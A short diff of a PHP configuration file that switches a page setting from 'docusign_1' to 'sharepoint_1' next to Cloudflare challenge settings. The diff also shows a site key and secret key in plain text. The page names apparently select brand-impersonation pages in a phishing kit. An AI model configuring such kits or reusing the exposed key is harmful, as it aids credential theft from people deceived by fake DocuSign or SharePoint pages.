@@ -11,6 +11,6 @@ $cloudflare_enabled = 0;
 $cloudflare_site_key = "0x4AAAAAAF5mxvFLUiYFV4Pb";
 $cloudflare_secret_key = "0x4AAAAAAF5mxnD0ej0BujFHV1Piq8sHiPU";
 
-$page_name = "docusign_1";
+$page_name = "sharepoint_1";
 
 ?>
